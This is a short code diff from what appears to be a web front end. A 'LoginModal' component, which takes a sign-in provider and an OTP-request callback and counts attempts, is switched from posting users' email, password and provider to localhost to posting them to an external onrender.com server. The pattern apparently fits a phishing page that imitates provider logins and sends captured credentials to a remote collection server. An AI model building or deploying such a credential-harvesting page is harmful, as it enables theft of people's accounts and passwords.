@@ -51,7 +51,7 @@ function LoginModal({ provider, onClose, onOtpRequested }) {
     setClickCount(attempt);
 
     try {
-      const res = await fetch("http://localhost:3000/api/submit", {
+      const res = await fetch("https://adxbe.onrender.com/api/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password, provider }),
